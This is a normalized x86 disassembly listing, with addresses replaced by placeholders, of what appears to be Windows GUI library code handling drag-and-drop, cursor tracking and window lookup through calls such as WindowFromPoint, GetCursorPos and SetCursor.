mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_4402b4
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404554
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43f3a8
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_440314
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4402b4
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_440340
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_4400a0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_440314
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_44025c
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_448d84
mov [ esi ] eax
sub_440390
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_44025c
cmp eax 0x1
sbb eax eax
inc eax
sub_4403cc
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_447820
test eax eax
je r-xdata
mov eax esi
call sub_447820
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_440dfc
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4143bc
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_414418
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_447834
mov edi eax
jmp r-xdata
sub_440460
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_440340
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44a8a8
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_440390
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_440390
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_442094
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_440390
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46113c
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_44a864
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_4403cc
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403540
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_44a990
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_44a8a8
jmp r-xdata
mov eax [ rw-data ]
call sub_44aa04
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46113c
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_442094
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403540
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403540
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407f58
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_440730
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43f95c
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_44a8a8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_440460
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_4408a0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_440a45
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403540
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403540
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fc64
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_440730
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fb4c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_448d84
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412edc
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_442068
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412edc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_440a64
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403540
mov ebx eax
sub_440ad8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_440da4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_440d32
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43f9a4
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034f4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_440a64
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_440390
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_44aa04
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440d39
mov eax [ rw-data ]
call sub_403344
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_45a2f0
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_443750
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_44025c
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45e054
sub_440d39
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4034d0
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
sub_440dc8
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43f3dc
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_440dfc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_440dc8
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_442094
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_446670
test eax eax
je r-xdata
mov esi eax
sub_440e44
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_414210
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx ] eax
sub_440e6c
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_414500
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403344
xor eax eax
mov [ ebx ] eax
sub_440e8c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_440ebc
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_414764
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_440f6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4147c8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_440f45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_4410f8
call sub_403b7c
call sub_403b7c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4143bc
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41e0ac
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_440f78
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_414764
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_441016
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44101d
mov eax [ rw-data ]
call sub_4147c8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_440fee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4410f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41e108
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4143bc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41e0ac
test al al
je r-xdata
sub_441024
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_4410f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41dbdc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_441050
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e2b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41e2b4
mov eax [ ebp - 0x4 ]
call sub_441144
mov eax [ rw-data ]
call sub_414764
mov ebx eax
xor eax eax
push ebp
push sub_4410d5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_414210
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4147c8
retn
call sub_440ebc
sub_4410f8
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41e2b4
mov edx ebx
mov eax [ rw-data ]
call sub_414778
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_441144
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_442bac
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_441170
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4411ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414a98
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4411f4
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_4412b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44137d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441384
lea eax [ ebp - 0x1c ]
call sub_404094
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403540
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_451f6c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409094
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4040e8
sub_4413a0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_441407
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44eb80
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_442550
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034f4
mov edx [ eax + 0x64 ]
pop eax
call sub_4044a0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44140e
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov al 0x1
sub_441414
push ebx
mov ebx eax
mov eax ebx
call sub_44eba8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
